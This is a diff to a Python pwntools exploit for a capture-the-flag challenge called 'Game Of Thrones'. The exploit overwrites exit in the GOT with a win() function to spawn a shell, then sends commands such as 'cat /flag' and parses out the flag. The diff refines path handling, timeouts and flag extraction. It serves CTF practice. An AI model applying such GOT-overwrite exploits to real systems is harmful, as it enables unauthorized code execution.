@@ -1,28 +1,17 @@
 #!/usr/bin/env python3
-"""
-Game Of Thrones - 100pts
-Binary Exploitation: Arbitrary Write + GOT Overwrite
-
-Estrategia:
-1. Cargar el binario local con pwntools (ELF) para extraer:
-   - Dirección de la función win()
-   - Dirección de exit en la GOT
-2. Conectar al servidor remoto
-3. Enviar address = exit@GOT
-4. Enviar value = win()
-5. El programa sobrescribe exit en la GOT con win
-6. Cuando exit(1) se ejecuta, salta a win() → /bin/sh
-7. Interactuar con el shell para obtener la flag
-"""
+# Game Of Thrones - GOT Overwrite exploit
 
 from pwn import *
+import os
 
 def exploit():
     # Cargar el binario local para obtener direcciones
     print("[*] Cargando binario local...")
     try:
-        # El binario se llama "reto" en ctf_argentina
-        elf = ELF("reto")
+        # Buscar el binario en la carpeta del script
+        script_dir = os.path.dirname(os.path.abspath(__file__))
+        reto_path = os.path.join(script_dir, "reto")
+        elf = ELF(reto_path)
         
         win_addr = elf.symbols['win']
         exit_got = elf.got['exit']
@@ -73,7 +62,7 @@ def exploit():
     
     # Dar un momento para que se estabilice la conexión
     import time
-    time.sleep(0.5)
+    time.sleep(1)
     
     # Intentar obtener la flag automáticamente
     try:
@@ -83,32 +72,45 @@ def exploit():
         flag_commands = [
             b"cat /flag\n",
             b"cat flag\n",
-            b"cat flag.txt\n",
-            b"ls -la\n",
         ]
         
+        flag_found = False
         for cmd in flag_commands:
             try:
                 p.sendline(cmd)
-                p.settimeout(1)
-                output = p.recvline(timeout=1)
+                p.settimeout(3)
+                # Recibir toda la salida disponible
+                output = b""
+                while True:
+                    try:
+                        chunk = p.recv(1024, timeout=0.5)
+                        if not chunk:
+                            break
+                        output += chunk
+                    except:
+                        break
                 
-                if b"IC{" in output or b"UNLP{" in output or b"flag" in output.lower():
-                    print(f"\n[+] FLAG ENCONTRADA:\n{output.decode(errors='replace')}\n")
-                    break
-                elif cmd == b"ls -la\n":
-                    print(f"[*] Listado:\n{output.decode(errors='replace')}")
+                if b"IC{" in output or b"UNLP{" in output:
+                    # Extraer solo la línea con la flag
+                    lines = output.decode(errors='replace').split('\n')
+                    for line in lines:
+                        if "IC{" in line or "UNLP{" in line:
+                            print(f"\n[+] FLAG ENCONTRADA:\n{line.strip()}\n")
+                            flag_found = True
+                            break
+                    if flag_found:
+                        break
             except Exception as e:
                 pass
         
-        # Modo interactivo como fallback
-        print("\n[*] Modo interactivo (escribe comandos manualmente si necesitas más info)")
-        p.interactive()
+        if not flag_found:
+            print("[-] No se encontró la flag en las ubicaciones comunes")
+        
+        p.close()
         
     except Exception as e:
         print(f"[-] Error: {e}")
-        print("[*] Entrando en modo interactivo manual...")
-        p.interactive()
+        p.close()
 
 if __name__ == "__main__":
     exploit()
